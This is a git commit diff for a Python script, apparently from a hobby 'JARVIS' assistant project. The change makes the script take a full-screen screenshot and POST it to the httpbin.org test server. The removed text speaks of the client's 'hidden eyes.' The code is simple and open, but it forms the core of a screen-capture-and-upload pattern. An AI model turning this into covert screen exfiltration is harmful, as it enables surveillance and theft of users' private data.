e2120436213d9cb03cdf6982e01d8f4ce174bd56
F1int <e084kn@gmail.com>
2026-08-12 19:21:08 +0300

    Successfully implemented client network bridge using requests library and tested with HTTP POST

--- main.py
+++ main.py
@@ -1,13 +1,26 @@
 import os
+import requests
 from PIL import ImageGrab
 
-print("ДЖАРВИС: Активирую модуль скрытых глаз клиента...")
-
-
-# 1. Делаем снимок всего экрана прямо сейчас
+print("ДЖАРВИС: Делаю снимок экрана...")
+#1. Делаем скриншот и сохраняем локально
 screenshot = ImageGrab.grab()
-
-# 2. Сохраняем получившуюся картинку в папку нашего проекта под именем screenshot.png
 screenshot.save("screenshot.png")
 
-print("ДЖАРВИС: Скриншот экрана успешно сделан и сохранен в папку проекта!")
+#2. Указываем адрес тестового сервера
+server_url = "https://httpbin.org/post"
+
+print(f"ДЖАРВИС: Отправляем файл screenshot.png на сервер {server_url}...")
+
+#3. Открываем файл и упаковываем его в сетевой пакет
+with open("screenshot.png", "rb") as file:
+    network_payload = {"file": file}
+
+    #4. Стреляем POST-запросом по сети
+    response = requests.post(server_url, files=network_payload)
+
+#5. Проверяем ответ сервера (Код 200 означает "Успешно долетело")
+if response.status_code == 200:
+    print("ДЖАРВИС: Сетевой мост работает! Файл успешно доставлен не сервер!")
+else:
+    print(f"ОШИБКА СЕТИ: Сервер вернул код {response.status_code}")
